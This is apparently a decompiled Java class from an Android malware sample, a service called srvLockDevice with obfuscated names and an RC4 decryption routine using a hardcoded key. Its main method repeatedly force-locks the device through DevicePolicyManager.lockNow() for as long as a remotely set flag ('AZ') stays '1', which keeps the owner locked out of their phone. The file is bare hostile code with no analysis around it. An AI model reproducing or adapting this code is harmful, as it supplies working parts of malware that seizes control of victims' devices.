/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.app.admin.DevicePolicyManager
 *  android.content.Context
 *  android.content.Intent
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class srvLockDevice
extends IntentService {
    utils optics$ = new utils();
    constants google$ = new constants();

    public srvLockDevice() {
        super("");
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onHandleIntent(Intent object) {
        boolean bl;
        do {
            utils.chalkTile(10);
            object = this.optics$;
            ((DevicePolicyManager)this.getSystemService("device_policy")).lockNow();
            utils._pensions((Context)this);
        } while (bl = this.optics$.SettingsRead((Context)this, "AZ").equals("1"));
        this.stopSelf();
    }
}

